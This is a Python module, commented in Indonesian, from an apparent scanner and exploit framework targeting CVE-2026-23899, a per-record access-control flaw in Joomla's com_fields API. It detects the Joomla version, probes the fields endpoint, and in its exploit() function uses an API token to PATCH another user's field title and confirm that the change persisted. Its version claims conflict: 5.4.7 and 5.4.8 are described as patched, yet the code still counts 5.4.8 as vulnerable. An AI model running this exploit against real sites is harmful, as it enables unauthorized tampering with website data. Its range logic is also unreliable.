#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core/joomla_api).

CVE-2026-23899 (komponen com_fields) — API fields/groups: ACL per-record tidak
                                          diperiksa pada 5.4.5/5.4.6.

Affected : 4.0.0 - 5.4.8, 6.0.0 - 6.1.3
Patched  : 5.4.9+ / 6.1.4+

          (5.4.8 hanya menambah gerbang core.manage pada level KOMPONEN; ACL per-record
           baru ditambahkan generik di ApiController::allowEdit() pada 5.4.9.)

ROOT CAUSE

    api/components/com_fields/src/Controller/FieldsController.php
    api/components/com_fields/src/Controller/GroupsController.php

    5.4.5 / 5.4.6 (VULNERABLE) — kedua controller HANYA mendefinisikan displayItem()
    dan displayList(). `add`, `edit`, dan `delete` diwarisi dari ApiController:

        // libraries/src/MVC/Controller/ApiController.php (5.4.5)
        protected function allowEdit($data = [], $key = 'id')
        {
            // $data dan $key DIABAIKAN
            return $this->app->getIdentity()->authorise('core.edit', $this->option);
        }

    `edit()` memanggil allowEdit([$key => $recordId], $key), tetapi override warisan
    mengabaikan record id sepenuhnya → hanya `core.edit` pada KOMPONEN yang diperiksa,
    bukan pada asset record (`<option>.field.<id>` / `<option>.fieldgroup.<id>`).

    5.4.7 (PATCHED) — override ditambahkan di kedua controller:

        protected function allowEdit($data = [], $key = 'id')
        {
            $recordId = isset($data[$key]) ? (int) $data[$key] : 0;
            $user     = $this->app->getIdentity();
            [$option] = explode('.', $this->getContextFromInput());

            if (!$recordId) {
                return $user->authorise('core.edit', $option);
            }

            if ($user->authorise('core.edit', $option . '.field.' . $recordId)) {
                return true;
            }

            if ($user->authorise('core.edit.own', $option . '.field.' . $recordId)) {
                $record = $this->getModel()->getItem($recordId);
                if (empty($record)) {
                    return false;
                }
                return $user->id == $record->created_user_id;
            }

            return false;
        }

        // GroupsController memakai $key = 'parent_id' dan suffix '.fieldgroup.'
        // Keduanya juga menambahkan public function delete() dengan cek core.delete.

    5.4.8 menambahkan gerbang `core.manage` dan validasi context record vs request.

Dampak: user dengan `core.edit` pada komponen (mis. com_contact) tetapi TANPA izin pada
asset field/fieldgroup spesifik dapat mengubah (PATCH) atau menghapus (DELETE) field
tersebut lewat API.

Endpoint (didaftarkan plugin webservices; container adalah `component=com_fields`,
context menentukan `$option`):
    /api/index.php/v1/fields/contacts/contact/<id>
    /api/index.php/v1/fields/contacts/mail/<id>
    /api/index.php/v1/fields/contacts/categories/<id>
    /api/index.php/v1/fields/groups/contacts/contact/<id>
    (analog untuk content/articles, users/…, dst.)

CATATAN ACL YANG SERING MENYESATKAN
    ACL Joomla bersifat OR-inherit: asset anak yang TIDAK menyebut sebuah grup akan
    mewarisi nilainya dari parent, sampai ke root. Menghapus grup dari rules asset anak
    TIDAK mencabut izin — grup tetap mendapatkannya dari root. Untuk menguji ACL
    per-record, DENY harus EKSPLISIT (`{"core.edit":{"6":0}}`). Uji pertama modul ini
    "lolos" pada 5.4.8 karena kesalahan ini.

Bukti lab (grup 6, asset `com_contact.field.900` = {"core.edit":{"8":1,"6":0}}):
    5.4.5 (8108) : PATCH /api/index.php/v1/fields/contacts/contact/900 {"title":"DENYTEST545"}
                   -> HTTP 200; jos_fields.title berubah menjadi DENYTEST545
    5.4.8 (8106) : PATCH -> HTTP 403 {"title":"Access Denied","code":403}; title tetap
"""

import json
import re

from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_RCE, ST_SKIP, ST_UNKNOWN, ST_VULN, detect_platform, parse_ver, register, ver_le)

MANIFEST = "/administrator/manifests/files/joomla.xml"
VULN_5_MAX = (5, 4, 8)
VULN_6_MAX = (6, 1, 3)


def _opt(opts, name):
    if opts is None:
        return None
    if isinstance(opts, dict):
        return opts.get(name)
    return getattr(opts, name, None)


def _joomla_version(t, h):
    """Versi Joomla dengan CACHE per-target.

    13 modul joomla_core membaca manifest yang sama. Tanpa cache, setiap modul
    mengulang GET-nya untuk host yang sama. Hasil kini disimpan pada `t._jver`
    sehingga hanya satu request per target per proses scan.
    """
    cached = getattr(t, "_jver", None)
    if cached is not None:
        return cached
    val = _joomla_version_uncached(t, h)
    try:
        t._jver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _joomla_version_uncached(t, h):
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                return v, m.group(1)
    return None, ""


def _in_range(ver):
    if ver is None:
        return None
    if ver[0] <= 3:
        return False
    if ver[0] == 4:
        return True
    if ver[0] == 5:
        return ver_le(ver, VULN_5_MAX)
    if ver[0] == 6:
        return ver_le(ver, VULN_6_MAX)
    return False


def _field_url(t, field_id):
    return f"{t.url}/api/index.php/v1/fields/contacts/contact/{field_id}"


def _probe(t, h, opts, do_write):
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan", f"version={ver_s}"

    token = _opt(opts, "api_token")
    if not token:
        return ST_SKIP, f"Joomla {ver_s} — butuh --api-token (X-Joomla-Token)", \
                        f"version={ver_s}"

    fid = _opt(opts, "field_id") or 1
    headers = {"X-Joomla-Token": token, "Content-Type": "application/json"}
    url = _field_url(t, fid)

    if not do_write:
        r = h.get(url, headers=headers)
        if r is None:
            return ST_UNKNOWN, "tidak bisa menghubungi API fields", f"version={ver_s}"
        if r.status_code == 401:
            return ST_SKIP, f"Joomla {ver_s} — token API ditolak (401 autentikasi)", \
                            f"version={ver_s} | GET HTTP 401"
        if r.status_code == 404:
            return ST_SKIP, f"Joomla {ver_s} — field id={fid} tidak ada (404)", \
                            f"version={ver_s} | GET HTTP 404"
        if r.status_code != 200:
            return ST_UNKNOWN, f"API fields tidak dapat diakses (HTTP {r.status_code})", \
                               f"version={ver_s} | GET HTTP {r.status_code}"
        # ATURAN: GET 200 hanya membuktikan endpoint terbaca, BUKAN bahwa ACL
        # per-record tembus. Status harus INFO sampai mutasi terbukti.
        return (ST_INFO,
                f"Joomla {ver_s} — endpoint fields terbaca; ACL per-record belum "
                f"diverifikasi (jalankan --exploit)",
                f"version={ver_s} | GET HTTP 200")

    # do_write: baca judul lama, PATCH title, lalu bandingkan.
    g = h.get(url, headers=headers)
    old_title = None
    if g is not None and g.status_code == 200:
        try:
            d = (g.json() or {}).get("data") or {}
            old_title = (d.get("attributes") or {}).get("title")
        except Exception:
            old_title = None

    marker = "MP23899F-%d" % (abs(hash(t.url)) % 100000)
    r = h.patch(url, data=json.dumps({"title": marker}), headers=headers)
    if r is None:
        return ST_UNKNOWN, "tidak bisa menghubungi API fields", f"version={ver_s}"
    if r.status_code == 403:
        return ST_CLEAN, f"Joomla {ver_s} — API fields menolak (403)", \
                         f"version={ver_s} | PATCH HTTP 403"
    if r.status_code == 401:
        return ST_SKIP, f"Joomla {ver_s} — token API ditolak (401)", \
                        f"version={ver_s} | PATCH HTTP 401"
    if r.status_code == 404:
        return ST_SKIP, f"Joomla {ver_s} — field id={fid} tidak ada (404)", \
                        f"version={ver_s} | PATCH HTTP 404"
    if r.status_code not in (200, 201):
        return ST_UNKNOWN, f"respons fields tidak menyimpulkan status (HTTP {r.status_code})", \
                           f"version={ver_s} | PATCH HTTP {r.status_code}"

    # Konfirmasi: nilai baru benar-benar tersimpan.
    after = None
    confirm_sc = None
    g2 = h.get(url, headers=headers)
    if g2 is not None:
        confirm_sc = g2.status_code
        if g2.status_code == 200:
            try:
                d2 = (g2.json() or {}).get("data") or {}
                after = (d2.get("attributes") or {}).get("title")
            except Exception:
                after = None
    if after is None:
        try:
            d = (r.json() or {}).get("data") or {}
            after = (d.get("attributes") or {}).get("title")
        except Exception:
            after = None

    persisted = after == marker and confirm_sc == 200
    ev = f"version={ver_s} | PATCH HTTP {r.status_code} | GET-confirm HTTP {confirm_sc} | " \
         f"field_id={fid} | old={old_title!r} new={after!r}"

    if persisted:
        return (ST_VULN,
                f"Joomla {ver_s} — field diubah tanpa ACL per-record "
                f"(terverifikasi GET ulang)", ev)
    if after == marker and confirm_sc != 200:
        return (ST_VULN,
                f"Joomla {ver_s} — field diubah tanpa ACL per-record "
                f"(ASSUMED: GET konfirmasi tidak tersedia)", ev)
    return (ST_CLEAN,
            f"Joomla {ver_s} — PATCH tidak mengubah nilai meski HTTP {r.status_code}",
            ev)


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    return _probe(t, h, opts, do_write=False)


def exploit(t, h, opts):
    return _probe(t, h, opts, do_write=True)


register(CveModule(
    cve="CVE-2026-23899",
    cluster="joomla_core",
    title="Joomla Core - com_fields API ACL per-record (fields/fieldgroups)",
    vclass="broken access control",
    cvss="6.5",
    severity="medium",
    cwe="CWE-863",
    product="Joomla! Core (com_fields ApiController)",
    versions_affected="4.0.0-5.4.8, 6.0.0-6.1.3",
    status="verified",
    requires=[
        "kredensial API (X-Joomla-Token) user dengan core.login.api",
        "user punya core.edit pada komponen (mis. com_contact) tetapi tidak pada "
        "asset field/fieldgroup spesifik",
        "field_id target (--field-id)",
    ],
    check=check,
    exploit=exploit,
    notes=("FieldsController/GroupsController 5.4.5-5.4.6 hanya mendefinisikan "
           "displayItem/displayList, sehingga add/edit/delete memakai allowEdit() "
           "warisan ApiController yang mengabaikan ($data,$key) dan hanya memeriksa "
           "core.edit pada KOMPONEN. 5.4.7 menambahkan override yang memeriksa "
           "core.edit pada '<option>.field.<id>' / '<option>.fieldgroup.<id>' plus "
           "delete(). Endpoint: /api/index.php/v1/fields/contacts/contact/<id>. "
           "Diverifikasi: 5.4.5 PATCH 200 + title berubah meski asset field DENY "
           "eksplisit untuk grup 6; 5.4.8 -> 403. Butuh --api-token dan --field-id. "
           "CATATAN: ACL Joomla OR-inherit - uji per-record WAJIB DENY eksplisit. RENTANG: patch generik per-record ada di 5.4.9 (ApiController::allowEdit() menambahkan asset '<option>.<singular>.<id>'); 5.4.7 hanya menambahkan override di com_fields/com_categories, 5.4.8 menambahkan gerbang core.manage. Verifikasi lab memakai 5.4.5 (VULN) vs 5.4.8 (CLEAN)."),
))
